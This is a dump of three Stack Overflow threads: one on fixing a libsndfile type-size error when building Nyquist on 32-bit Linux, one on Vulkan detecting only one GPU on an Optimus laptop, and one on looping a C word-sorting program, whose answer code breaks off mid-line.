[{"tags": ["c", "linux", "gnu", "libsndfile", "nyquist"], "comments": [{"owner": {"reputation": 66560, "user_id": 9072753, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/EPmGy.jpg?s=128&g=1", "display_name": "KamilCuk", "link": "https://stackoverflow.com/users/9072753/kamilcuk"}, "edited": false, "score": 0, "creation_date": 1545868391, "post_id": 53938092, "comment_id": 94716627, "body": "Can you post what is <code>off_t</code>  defined to on your machine? How is <code>sf_count_t</code> defined on your machine? (just include relevant headers and use <a href=\"https://stackoverflow.com/questions/2160635/is-there-a-way-to-print-out-the-type-of-a-variable-pointer-in-c\">such trick</a> to check it). What happens if you remove <a href=\"https://github.com/svn2github/nyquist/blob/master/nylsf/file_io.c#L541\" rel=\"nofollow noreferrer\">the check</a> from psf_open_fd and recompile? What if you just <code>typedef off_t sf_count_t;</code> and  recompile? libsndfile has a <a href=\"https://github.com/erikd/libsndfile/blob/master/src/file_io.c#L529\" rel=\"nofollow noreferrer\">different check</a>."}, {"owner": {"user_type": "does_not_exist", "display_name": "user10605163"}, "edited": false, "score": 0, "creation_date": 1545869359, "post_id": 53938092, "comment_id": 94716775, "body": "Could you clarify whether a system libsndfile is present (from gentoo/portage) and how exactly you are trying to build nyquist?"}, {"owner": {"reputation": 21, "user_id": 10836808, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6e2c93e15b92fbf0fdb253ac8e657008?s=128&d=identicon&r=PG&f=1", "display_name": "steve-blobs", "link": "https://stackoverflow.com/users/10836808/steve-blobs"}, "reply_to_user": {"reputation": 66560, "user_id": 9072753, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/EPmGy.jpg?s=128&g=1", "display_name": "KamilCuk", "link": "https://stackoverflow.com/users/9072753/kamilcuk"}, "edited": false, "score": 0, "creation_date": 1545869390, "post_id": 53938092, "comment_id": 94716780, "body": "@Kamil Cuk, I&#39;m afraid I don&#39;t completely understand your request or the information in the link. In this file on line 19: <a href=\"https://github.com/svn2github/nyquist/blob/36e55e16da89d4ef87c361920bd16f34c06fb8f3/snd/wxsnd.h#L19\" rel=\"nofollow noreferrer\">github.com/svn2github/nyquist/blob/&hellip;</a>&quot; , off_t is defined as an int, and navigating to my own program where I cloned the source and compiled, it seems unchanged (I don&#39;t know how to get it&#39;s value though, if any). I know you want to know what value these variables have been assigned, and I am looking into getting this information in the mean time. I will attempt the relevant recompile momentarily."}, {"owner": {"user_type": "does_not_exist", "display_name": "user10605163"}, "edited": false, "score": 0, "creation_date": 1545869918, "post_id": 53938092, "comment_id": 94716855, "body": "<code>off_t</code> is not supposed to be defined in the nyquist or libsndfile sources, it is part of the POSIX standard and defined in the libc. So it might also be helpful to know whether you are using glibc (gentoo default) or e.g. musl or uclibc. The linked definition of <code>off_t</code> is a replacement for non-POSIX systems. <code>off_t</code> and <code>sf_count_t</code> are both <i>types</i> btw, not functions or variables."}, {"owner": {"reputation": 21, "user_id": 10836808, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6e2c93e15b92fbf0fdb253ac8e657008?s=128&d=identicon&r=PG&f=1", "display_name": "steve-blobs", "link": "https://stackoverflow.com/users/10836808/steve-blobs"}, "edited": false, "score": 0, "creation_date": 1545872231, "post_id": 53938092, "comment_id": 94717171, "body": "@user10605163, this file and library is from Gentoo/Portage, yes. I was building Nyquist from source using ccmake, as per the instructions here: <a href=\"https://github.com/svn2github/nyquist/tree/36e55e16da89d4ef87c361920bd16f34c06fb8f3/sys/unix\" rel=\"nofollow noreferrer\">github.com/svn2github/nyquist/tree/&hellip;</a>. As for your second comment, it seems I am using libc but also have glibc installed. And thanks for clarifying my improper use of the word functions, I will edit the OP to reflect this."}, {"owner": {"user_type": "does_not_exist", "display_name": "user10605163"}, "edited": false, "score": 0, "creation_date": 1545875721, "post_id": 53938092, "comment_id": 94717624, "body": "@steve-blobs I have added another option based on the README in <code>nyquist&#47;nylsf</code> that I overlooked. Also note that <code>glibc</code> (GNU C library) is one possible implementation of the C library (or <code>libc</code>). Having both of them is normal."}], "answers": [{"comments": [{"owner": {"reputation": 21, "user_id": 10836808, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6e2c93e15b92fbf0fdb253ac8e657008?s=128&d=identicon&r=PG&f=1", "display_name": "steve-blobs", "link": "https://stackoverflow.com/users/10836808/steve-blobs"}, "edited": false, "score": 0, "creation_date": 1545876000, "post_id": 53938709, "comment_id": 94717661, "body": "I will certainly follow up with the author, with all due credit to user10605163 of course, by asking for the aforementioned file and sharing any solution (he requested I follow up if it was resolved). Solution #2 also seems like a nice way to go about it and might lead to a more portable solution, but that&#39;s for another day if solution 3 will work. Anyway, running &quot;$ ccmake .&quot; in the directory with a freshly cloned repo and the add_compile_definitions line added end of file resulted in:  &quot;Unknown CMake Command &quot;add_compile_definitions&quot;, so perhaps the syntax was off a bit?"}, {"owner": {"reputation": 21, "user_id": 10836808, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6e2c93e15b92fbf0fdb253ac8e657008?s=128&d=identicon&r=PG&f=1", "display_name": "steve-blobs", "link": "https://stackoverflow.com/users/10836808/steve-blobs"}, "edited": false, "score": 0, "creation_date": 1545876600, "post_id": 53938709, "comment_id": 94717729, "body": "Following up on that, I think the desired syntax is add_definitions, seen here: <a href=\"https://cmake.org/cmake/help/v3.0/command/add_definitions.html\" rel=\"nofollow noreferrer\">cmake.org/cmake/help/v3.0/command/add_definitions.html</a>. It passed  ccmake like that, but gcc failed with: &quot;gcc: error: _FILE_OFFSET_BITS=64: No such file or directory&quot;. I see now you&#39;ve provided a solution 4 which seems a bit more elegant and I&#39;ll start taking a look at that."}, {"owner": {"user_type": "does_not_exist", "display_name": "user10605163"}, "reply_to_user": {"reputation": 21, "user_id": 10836808, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6e2c93e15b92fbf0fdb253ac8e657008?s=128&d=identicon&r=PG&f=1", "display_name": "steve-blobs", "link": "https://stackoverflow.com/users/10836808/steve-blobs"}, "edited": false, "score": 0, "creation_date": 1545876914, "post_id": 53938709, "comment_id": 94717782, "body": "@steve-blobs The syntax on non-recent cmake versions is <code>add_definitions(-D_FILE_OFFSET_BITS=64)</code>, see the answers and edit to the accepted answer in <a href=\"https://stackoverflow.com/questions/9017573/define-preprocessor-macro-through-cmake\" title=\"define preprocessor macro through cmake\">stackoverflow.com/questions/9017573/&hellip;</a> I overlooked how recent the change was."}, {"owner": {"reputation": 21, "user_id": 10836808, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6e2c93e15b92fbf0fdb253ac8e657008?s=128&d=identicon&r=PG&f=1", "display_name": "steve-blobs", "link": "https://stackoverflow.com/users/10836808/steve-blobs"}, "edited": false, "score": 0, "creation_date": 1545877175, "post_id": 53938709, "comment_id": 94717830, "body": "Do you have any idea how I&#39;d find version 1.0.17 of libsndfile (the version mentioned in the README.txt)?"}, {"owner": {"reputation": 21, "user_id": 10836808, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6e2c93e15b92fbf0fdb253ac8e657008?s=128&d=identicon&r=PG&f=1", "display_name": "steve-blobs", "link": "https://stackoverflow.com/users/10836808/steve-blobs"}, "edited": false, "score": 0, "creation_date": 1545877326, "post_id": 53938709, "comment_id": 94717857, "body": "I see, thank you for the syntax correction. I haven&#39;t figured out any of the solutions 1-4 yet but as soon as I do and confirm they work I&#39;ll mark it as accepted, thank you <i>very</i> much for the detailed and extremely helpful answer. I was shocked to get any help at all on this, let alone such quick, detailed and sufficiently verbose help."}, {"owner": {"user_type": "does_not_exist", "display_name": "user10605163"}, "reply_to_user": {"reputation": 21, "user_id": 10836808, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6e2c93e15b92fbf0fdb253ac8e657008?s=128&d=identicon&r=PG&f=1", "display_name": "steve-blobs", "link": "https://stackoverflow.com/users/10836808/steve-blobs"}, "edited": false, "score": 0, "creation_date": 1545877783, "post_id": 53938709, "comment_id": 94717917, "body": "@steve-blobs There doesn&#39;t seem to be a release tag in the git-repo and the author&#39;s website doesn&#39;t seem to have a link to older releases, but I think you can easily guess the correct link name if you take the download link on the author&#39;s site and adjust it a bit to fit the version. There are also going to be mirrors of linux distributions out there that have the copy."}, {"owner": {"reputation": 21, "user_id": 10836808, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6e2c93e15b92fbf0fdb253ac8e657008?s=128&d=identicon&r=PG&f=1", "display_name": "steve-blobs", "link": "https://stackoverflow.com/users/10836808/steve-blobs"}, "edited": false, "score": 0, "creation_date": 1545878107, "post_id": 53938709, "comment_id": 94717966, "body": "Solution #3 has worked, and I will work toward a more portable and elegant solution like the other ones you outlined. Thank you so much!!"}], "tags": [], "owner": {"user_type": "does_not_exist", "display_name": "user10605163"}, "is_accepted": true, "score": 3, "last_activity_date": 1545876973, "last_edit_date": 1545876973, "creation_date": 1545872503, "answer_id": 53938709, "question_id": 53938092, "link": "https://stackoverflow.com/questions/53938092/how-is-the-type-sf-count-t-in-sndfile-h-defined-in-libsndfile/53938709#53938709", "title": "How is the type sf_count_t in sndfile.h defined in libsndfile?", "body": "<p>If you look at the sources for the bundled <code>libsndfile</code> in <code>nyquist</code>, i.e. <code>nylsf</code>, then you see that <code>sndfile.h</code> is provided directly. It defines <code>sf_count_t</code> as a 64-bit integer.</p>\n\n<p>The <code>libsndfile</code> sources however do not have this file, rather they have a <code>sndfile.h.in</code>. This is an input file for <code>autoconf</code>, which is a tool that will generate the proper header file from this template. It has currently the following definition for <code>sf_count_t</code> for linux systems (and had it since a while):</p>\n\n<pre><code>typedef @TYPEOF_SF_COUNT_T@ sf_count_t ;\n</code></pre>\n\n<p>The <code>@TYPEOF_SF_COUNT_T@</code> would be replaced by <code>autoconf</code> to generate a header with a working type for <code>sf_count_t</code> for the system that is going to be build for. The header file provided by <code>nyquist</code> is therefore <em>already</em> configured (presumably for the system of the author).</p>\n\n<p><code>off_t</code> is a type specified by the POSIX standard and defined in the system's libc. Its size on a system using the GNU C library is 32bit if the system is 32bit.</p>\n\n<p>This causes the sanity check in question to fail, because the sizes of <code>sf_count_t</code> and <code>off_t</code> don't match. The error message is also correct, as we are using an unfittingly configured <code>sndfile.h</code> for the build.</p>\n\n<p>As I see it you have the following options:</p>\n\n<ol>\n<li><p>Ask the <code>nyquist</code> author to provide the unconfigured <code>sndfile.h.in</code> and to use <code>autoconf</code> to configure this file at build time.</p></li>\n<li><p>Do not use the bundled <code>libsndfile</code> and link against the system's one. (This requires some knowledge and work to change the build scripts and header files, maybe additional unexpected issues)</p></li>\n<li><p>If you are using the GNU C library (glibc): The preprocessor macro <code>_FILE_OFFSET_BITS</code> can be set to <code>64</code> to force the size of <code>off_t</code> and the rest of the file interface to use the 64bit versions even on 32bit systems. </p>\n\n<p>This may or may not work depending on whether your system supports it and it is not a clean solution as there may be additional misconfiguration of <code>libsndfile</code> going unnoticed. This flag could also introduce other interface changes that the code relies on, causing further build or runtime errors/vulnerabilities.</p>\n\n<p>Nonetheless, I think the syntax for cmake would be to add:</p>\n\n<pre><code>add_compile_definitions(_FILE_OFFSET_BITS=64)\n</code></pre>\n\n<p>or depending on cmake version:</p>\n\n<pre><code>add_definitions(-D_FILE_OFFSET_BITS=64)\n</code></pre>\n\n<p>in the appropriate <code>CMakeLists.txt</code>.</p></li>\n<li><p>Actually the <a href=\"http://svn.code.sf.net/p/nyquist/code/trunk/nyquist/nylsf/README.txt\" rel=\"nofollow noreferrer\">README in <code>nyquist/nylsf</code></a> explains how the files for it were generated. You may try to obtain the source code of the same <code>libsndfile</code> version it is based on and repeat the steps given to produce an <code>nylsf</code> configured to your system. It may cause less further problems than 2. and 3. because there wouldn't be any version/interface changes introduced.</p></li>\n</ol>\n"}], "owner": {"reputation": 21, "user_id": 10836808, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6e2c93e15b92fbf0fdb253ac8e657008?s=128&d=identicon&r=PG&f=1", "display_name": "steve-blobs", "link": "https://stackoverflow.com/users/10836808/steve-blobs"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 279, "favorite_count": 0, "accepted_answer_id": 53938709, "answer_count": 1, "score": 1, "last_activity_date": 1545876973, "creation_date": 1545865698, "last_edit_date": 1545872071, "question_id": 53938092, "link": "https://stackoverflow.com/questions/53938092/how-is-the-type-sf-count-t-in-sndfile-h-defined-in-libsndfile", "title": "How is the type sf_count_t in sndfile.h defined in libsndfile?", "body": "<p>I am trying to work with Nyquist (a music programming platform, see: <a href=\"https://www.cs.cmu.edu/~music/nyquist/\" rel=\"nofollow noreferrer\">https://www.cs.cmu.edu/~music/nyquist/</a> or <a href=\"https://www.audacityteam.org/about/nyquist/\" rel=\"nofollow noreferrer\">https://www.audacityteam.org/about/nyquist/</a>) as a standalone program and it utilizes libsndfile (a library for reading and writing sound, see: <a href=\"http://www.mega-nerd.com/libsndfile/\" rel=\"nofollow noreferrer\">http://www.mega-nerd.com/libsndfile/</a>). I am doing this on an i686 GNU/Linux machine (Gentoo). </p>\n\n<p>After successful set up and launching the program without errors, I tried to generate sound via one of the examples, \"(play (osc 60))\", and was met with this error: </p>\n\n<pre><code>*** Fatal error : sizeof (off_t) != sizeof (sf_count_t)\n*** This means that libsndfile was not configured correctly.\n</code></pre>\n\n<p>Investigating this further (and emailing the author) has proved somewhat helpful, but the solution is still far from my grasp. The author recommended looking at /usr/include/sndfile.h to see how sf_count_t is defined, and (this portion of) my file is identical to his:</p>\n\n<pre><code>/* The following typedef is system specific and is defined when libsndfile is\n** compiled. sf_count_t will be a 64 bit value when the underlying OS allows\n** 64 bit file offsets.\n** On windows, we need to allow the same header file to be compiler by both GCC\n** and the Microsoft compiler.\n*/\n\n#if (defined (_MSCVER) || defined (_MSC_VER))\ntypedef __int64         sf_count_t ;\n#define SF_COUNT_MAX          0x7fffffffffffffffi64\n#else\ntypedef int64_t sf_count_t ;\n#define SF_COUNT_MAX            0x7FFFFFFFFFFFFFFFLL\n#endif\n</code></pre>\n\n<p>In the above the author notes there is no option for a \"32 bit offset\". I'm not sure how I would proceed. Here is the particular file the author of Nyquist recommend I investigate: <a href=\"https://github.com/erikd/libsndfile/blob/master/src/sndfile.h.in\" rel=\"nofollow noreferrer\">https://github.com/erikd/libsndfile/blob/master/src/sndfile.h.in</a> , and here is the entire source tree: <a href=\"https://github.com/erikd/libsndfile\" rel=\"nofollow noreferrer\">https://github.com/erikd/libsndfile</a></p>\n\n<p>Here are some relevant snippets from the authors email reply: </p>\n\n<blockquote>\n  <p>\"I'm guessing sf_count_t must be showing up as 32-bit and you want\n  libsndfile to use 64-bit file offsets. I use nyquist/nylsf which is a\n  local copy of libsndfile sources -- it's more work keeping them up to\n  date (and so they probably aren't) but it's a lot easier to build and\n  test when you have a consistent library.\"</p>\n  \n  <p>\"I use CMake and nyquist/CMakeLists.txt to build nyquist.\"</p>\n  \n  <p>\"It may be that one 32-bit machines, the default sf_count_t is 32\n  bits, but I don't think Nyquist supports this option.\"</p>\n</blockquote>\n\n<p>And here is the source code for Nyquist: <a href=\"http://svn.code.sf.net/p/nyquist/code/trunk/nyquist/\" rel=\"nofollow noreferrer\">http://svn.code.sf.net/p/nyquist/code/trunk/nyquist/</a></p>\n\n<p>This problem is difficult for me to solve because it's composed of an niche use case of  relatively obscure software. This also makes the support outlook for the problem a bit worrisome. I know a little C++, but I am far from confident in my ability to solve this. Thanks for reading and happy holidays to all. If you have any suggestions, even in terms of formatting or editing, please do not hesitate!</p>\n"}, {"tags": ["c", "vulkan", "optimus"], "answers": [{"comments": [{"owner": {"reputation": 21, "user_id": 5601367, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2a81b1bb30836557ded1a5ddbd8b8d69?s=128&d=identicon&r=PG&f=1", "display_name": "Israphel", "link": "https://stackoverflow.com/users/5601367/israphel"}, "edited": false, "score": 0, "creation_date": 1545872488, "post_id": 53938503, "comment_id": 94717205, "body": "Thanks for your reply. Howerer, setting it to auto-detect on NVIDIA panel yields same results as running it on Intel, it doesn&#39;t list NVIDIA GPU. Also adding <code>__declspec(dllexport) uint32_t NvOptimusEnablement = 0x00000001;</code> (without <code>extern &quot;C&quot; {}</code> as it is already written in C) didn&#39;t change anything. Shouldn&#39;t Vulkan be able to detect both GPUs regardless of user config if they have drivers and they are active?"}, {"owner": {"reputation": 374839, "user_id": 734069, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/a356923f858fbe363dad1dc566837fc6?s=128&d=identicon&r=PG", "display_name": "Nicol Bolas", "link": "https://stackoverflow.com/users/734069/nicol-bolas"}, "reply_to_user": {"reputation": 21, "user_id": 5601367, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2a81b1bb30836557ded1a5ddbd8b8d69?s=128&d=identicon&r=PG&f=1", "display_name": "Israphel", "link": "https://stackoverflow.com/users/5601367/israphel"}, "edited": false, "score": 1, "creation_date": 1545878644, "post_id": 53938503, "comment_id": 94718065, "body": "@Israphel: You talk about what &quot;Vulkan&quot; ought to do as though it has higher priority than what the drivers or OS say. It doesn&#39;t. If NVIDIA&#39;s Optimus technology hijacks the OS back-end, such that it always sees only one GPU, simply switching which one is exposed to the application, Vulkan cannot fix that. Vulkan is subservient; the drivers are ultimately what are in control. Now, I&#39;m not saying that there isn&#39;t a way, but you shouldn&#39;t <i>assume</i> that there must be one."}], "tags": [], "owner": {"reputation": 26262, "user_id": 85306, "user_type": "registered", "accept_rate": 94, "profile_image": "https://www.gravatar.com/avatar/4283ac48d7f22118cc4e47a514b3269c?s=128&d=identicon&r=PG", "display_name": "Jherico", "link": "https://stackoverflow.com/users/85306/jherico"}, "is_accepted": false, "score": 0, "last_activity_date": 1545878825, "last_edit_date": 1545878825, "creation_date": 1545870155, "answer_id": 53938503, "question_id": 53938011, "link": "https://stackoverflow.com/questions/53938011/vulkan-sdk-detects-only-1-gpu-at-a-time/53938503#53938503", "title": "Vulkan SDK detects only 1 GPU at a time", "body": "<p>I'm not sure what you mean by </p>\n\n<blockquote>\n  <p>If I run on integrated GPU</p>\n</blockquote>\n\n<p>versus </p>\n\n<blockquote>\n  <p>If I run on dedicated GPU\"...</p>\n</blockquote>\n\n<p>If you're going into the nVidia control panel and specifying a target GPU for your application, then you're seeing pretty much what I would expect... only that GPU exposed to your app.  </p>\n\n<p>I believe what you should be doing is setting it to auto-detect, and then ensuring that you're exporting the \"Optimus Aware\" flag in your binary.  You should have something like this in your test code</p>\n\n<pre><code>extern \"C\" {\n_declspec(dllexport) uint32_t NvOptimusEnablement = 0x00000001;\n}\n</code></pre>\n\n<p>That should either cause Vulkan to see both GPUs, <em>or</em> force your application to automatically see only the discrete GPU, but without you having to do anything in the control panel, not sure which.</p>\n"}], "owner": {"reputation": 21, "user_id": 5601367, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2a81b1bb30836557ded1a5ddbd8b8d69?s=128&d=identicon&r=PG&f=1", "display_name": "Israphel", "link": "https://stackoverflow.com/users/5601367/israphel"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 793, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1545878825, "creation_date": 1545864959, "question_id": 53938011, "link": "https://stackoverflow.com/questions/53938011/vulkan-sdk-detects-only-1-gpu-at-a-time", "title": "Vulkan SDK detects only 1 GPU at a time", "body": "<p>I have an Optimus notebook (meaning it has two graphics cards; one integrated and one discrete (dedicated)). Both of them support Vulkan and I can use each of them individually on my code. But there is a problem, I can't list or use them both on the same program. I must select on which GPU it runs before running my code (on Windows: right click on \"myProgram.exe\" -> Run with graphics processor, on Linux: ./\"myProgram\" for integrated GPU and primusrun ./\"myProgram\" for discrete) and it detects only the one I run my code on even when both GPUs are active at the same time.</p>\n\n<p>My GPUs are Intel UHD Graphics 630 and NVIDIA GeForce GTX 1050 Ti. I am using LunarG Vulkan SDK 1.1.92, Intel driver version 25.20.100.6326, NVIDIA driver version 416.32 on Windows and 415.25 on Linux. As C compiler and operating system, MSVC 1912 on Windows 10 and gcc 8.2.1 on Arch Linux. Vulkan runtime and ICD loaders are installed and I get the same result on both OSs.</p>\n\n<p>Here is my code:</p>\n\n<pre><code>uint32_t deviceCount;\nvkEnumeratePhysicalDevices(instance, &amp;deviceCount, NULL);\nprintf(\"Found: %d\\n\", deviceCount);\n\nVkPhysicalDevice *devices = malloc(deviceCount * sizeof(VkPhysicalDevice));\nvkEnumeratePhysicalDevices(instance, &amp;deviceCount, devices);\n\nfor(uint32_t deviceIndex = 0; deviceIndex &lt; deviceCount; deviceIndex++)\n{\n    VkPhysicalDeviceProperties deviceProperties;\n    vkGetPhysicalDeviceProperties(devices[deviceIndex], &amp;deviceProperties);\n    printf(\"%s\\n\", deviceProperties.deviceName);\n}\n</code></pre>\n\n<p>Here is the outputs I get:</p>\n\n<p>If I run on integrated GPU:</p>\n\n<pre><code>Found: 1\nIntel(R) UHD Graphics 630\n</code></pre>\n\n<p>If I run on dedicated GPU:</p>\n\n<pre><code>Found: 1\nGeForce GTX 1050 Ti\n</code></pre>\n\n<p>What I am expecting is:</p>\n\n<pre><code>Found: 2\nIntel(R) UHD Graphics 630\nGeForce GTX 1050 Ti\n</code></pre>\n\n<p>And I should be able to pick either of them to use on my program without hassling with some driver level code or setting it on my OS before running. Vulkan is relatively low level API after all. Is there any way to force list all of the active GPUs on my system?</p>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 37414, "user_id": 204883, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ba29060be0758fa6537ff3d768a91757?s=128&d=identicon&r=PG", "display_name": "Arkku", "link": "https://stackoverflow.com/users/204883/arkku"}, "edited": false, "score": 2, "creation_date": 1545864112, "post_id": 53937852, "comment_id": 94715835, "body": "<code>sizeof(char)</code> is always 1 by definition, so you don&#39;t need to multiply by it. Also, without knowing what <code>L</code> is, allocating each element of <code>*words[L]</code> as also having length <code>L</code> seems weird. You might want something like <code>*words[MAX_WORDS]</code> and then allocate them as <code>words[j] = malloc(MAX_WORD_LENGTH + 1);</code> (Also, don&#39;t cast the return value of <code>malloc</code>.)"}, {"owner": {"reputation": 22495, "user_id": 5382650, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/THfCr.png?s=128&g=1", "display_name": "Craig Estey", "link": "https://stackoverflow.com/users/5382650/craig-estey"}, "edited": false, "score": 0, "creation_date": 1545865508, "post_id": 53937852, "comment_id": 94716098, "body": "I&#39;ve run your program here and it appears to work (e.g. It parses the sentence, sorts the words, and prints the words in sorted order). What issues are you having? As a side note, your program can be cleaned up a bit. (e.g.) I would <code>realloc</code> the <code>words</code> array on a dynamic basis as the line is parsed rather than relying on a fixed allocation"}, {"owner": {"reputation": 589605, "user_id": 1491895, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/82f9e178a16364bf561d0ed4da09a35d?s=128&d=identicon&r=PG", "display_name": "Barmar", "link": "https://stackoverflow.com/users/1491895/barmar"}, "edited": false, "score": 0, "creation_date": 1545865514, "post_id": 53937852, "comment_id": 94716099, "body": "The first loop that converts <code>word</code> to lower case is unnecessary, since the first iteration of the <code>while (word != NULL)</code> loop will do it again."}, {"owner": {"reputation": 589605, "user_id": 1491895, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/82f9e178a16364bf561d0ed4da09a35d?s=128&d=identicon&r=PG", "display_name": "Barmar", "link": "https://stackoverflow.com/users/1491895/barmar"}, "edited": false, "score": 0, "creation_date": 1545865595, "post_id": 53937852, "comment_id": 94716116, "body": "You say the problem is with a function that calls this function in a loop. You need to post <i>that</i> function."}, {"owner": {"reputation": 589605, "user_id": 1491895, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/82f9e178a16364bf561d0ed4da09a35d?s=128&d=identicon&r=PG", "display_name": "Barmar", "link": "https://stackoverflow.com/users/1491895/barmar"}, "edited": false, "score": 0, "creation_date": 1545865621, "post_id": 53937852, "comment_id": 94716123, "body": "And this code isn&#39;t even inside a function definition. Show that as well."}, {"owner": {"reputation": 22495, "user_id": 5382650, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/THfCr.png?s=128&g=1", "display_name": "Craig Estey", "link": "https://stackoverflow.com/users/5382650/craig-estey"}, "reply_to_user": {"reputation": 589605, "user_id": 1491895, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/82f9e178a16364bf561d0ed4da09a35d?s=128&d=identicon&r=PG", "display_name": "Barmar", "link": "https://stackoverflow.com/users/1491895/barmar"}, "edited": false, "score": 0, "creation_date": 1545865823, "post_id": 53937852, "comment_id": 94716172, "body": "@Barmar To get the missing pieces, I just wrapped the code inside a <code>main</code>, added (e.g.) <code>#define L 1000</code> and added the requisite <code>#include</code> and it seemed to work for me."}, {"owner": {"reputation": 119, "user_id": 10448650, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-loFEnRGgg2I/AAAAAAAAAAI/AAAAAAAAAAA/AAN31DW1dwoTTNO7OAAnLXanFcIBJOg01A/mo/photo.jpg?sz=128", "display_name": "Yuri J", "link": "https://stackoverflow.com/users/10448650/yuri-j"}, "edited": false, "score": 0, "creation_date": 1545865847, "post_id": 53937852, "comment_id": 94716176, "body": "Is this the <code>main</code> function or is this an auxiliary function you call inside <code>main</code> in a loop? If it is the latter, you should post the contents of <code>main</code> also. If it is the former, you should put everything inside a giant loop. Notice the input portion of the code isn&#39;t inside a loop, so how could it be repeated without <code>goto</code>s?"}, {"owner": {"reputation": 589605, "user_id": 1491895, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/82f9e178a16364bf561d0ed4da09a35d?s=128&d=identicon&r=PG", "display_name": "Barmar", "link": "https://stackoverflow.com/users/1491895/barmar"}, "reply_to_user": {"reputation": 22495, "user_id": 5382650, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/THfCr.png?s=128&g=1", "display_name": "Craig Estey", "link": "https://stackoverflow.com/users/5382650/craig-estey"}, "edited": false, "score": 0, "creation_date": 1545866079, "post_id": 53937852, "comment_id": 94716219, "body": "@CraigEstey He said he&#39;s trying to use it in a loop. How did you add that missing piece? Anyway, we need to see how the OP did it, since he obviously did it wrong."}], "answers": [{"comments": [{"owner": {"reputation": 1, "user_id": 10836775, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-T03DaR2XfSk/AAAAAAAAAAI/AAAAAAAAA8k/JdIYZ6-GCXk/photo.jpg?sz=128", "display_name": "Andrei - Alexandru Harpa", "link": "https://stackoverflow.com/users/10836775/andrei-alexandru-harpa"}, "edited": false, "score": 0, "creation_date": 1545871901, "post_id": 53938439, "comment_id": 94717124, "body": "Thank you very much!!! The explanation with include, define and main were not that relevant because i did that, but I posted just the body of the main. I appreciate you help. Moreover, I would be very grateful if you could give me an example on the same problem, but using values(ex: 1 to repeat or 2 to exit)."}, {"owner": {"user_type": "does_not_exist", "display_name": "user10835998"}, "reply_to_user": {"reputation": 1, "user_id": 10836775, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-T03DaR2XfSk/AAAAAAAAAAI/AAAAAAAAA8k/JdIYZ6-GCXk/photo.jpg?sz=128", "display_name": "Andrei - Alexandru Harpa", "link": "https://stackoverflow.com/users/10836775/andrei-alexandru-harpa"}, "edited": false, "score": 0, "creation_date": 1545872659, "post_id": 53938439, "comment_id": 94717232, "body": "@Andrei-AlexandruHarpa you are welcome! If I understand you correctly you mean an example which awaits user input <b>1</b> or <b>2</b> and if <b>1</b> is read the loop should be repeated and if <b>2</b> is read the program should exit?"}], "tags": [], "owner": {"user_type": "does_not_exist", "display_name": "user10835998"}, "is_accepted": false, "score": 0, "last_activity_date": 1545877628, "last_edit_date": 1545877628, "creation_date": 1545869562, "answer_id": 53938439, "question_id": 53937852, "link": "https://stackoverflow.com/questions/53937852/hi-i-tried-to-make-this-program-run-multiple-timesusing-for-and-do-while/53938439#53938439", "title": "Hi, I tried to make this program run multiple times(using for(;;) and do...while) but every time it stops at reading the string", "body": "<p>I added the <code>#includes</code>, a <code>#define</code> for L, wrapped everything inside a <code>main</code> function and placed a <code>while(1)</code> loop inside the <code>main</code> function. At the start of the <code>while(1)</code> loop I added <code>nrCuvinte = 0;</code> and <code>i = 0;</code> in order to reset those variables. I also added the ability to break out of the <code>while(1)</code> loop by typing in 'yes' when asked to do so.</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\n#include &lt;ctype.h&gt;\n\n#define L 500\n\nint main(){\n\n  char user_input[4];\n  char *words[L];\n  char *word;\n  char sentence[100];\n  int i = 0, nrCuvinte = 0;\n  int j, k, ok, n, lung;\n\n  while(1){\n    i = 0;\n    nrCuvinte = 0;\n    for(j=0;j&lt;L;++j){\n      words[j] = (char*)malloc(L*sizeof(char));\n    }\n    printf(\"Enter any sentence you want: \\n\");\n\n    fgets(sentence,99,stdin);\n    lung = strlen(sentence);\n\n    if(sentence[lung-1] == '\\n'){\n      sentence[lung-1] = '\\0';\n    }\n    printf(\"\\n\");\n\n    word = strtok(sentence, \" .,-;/?!\");\n    for(j=0;j&lt;(strlen(word)+1);j++){\n      word[j] = tolower((unsigned char) word[j]);\n    }\n    while(word != NULL)\n    {\n      for(j=0;j&lt;(strlen(word)+1);j++){\n        word[j] = tolower((unsigned char) word[j]);\n      }\n      strcpy(words[i],word);\n      word = strtok(NULL, \" .,-;/?!\");\n      ++i;\n      ++nrCuvinte;\n    }\n\n    n = nrCuvinte-1;\n    do{\n      ok =1;\n      for(k=0;k&lt;n;++k){\n        if(strcmp(words[k],words[k+1])&gt;0)\n        {\n          char 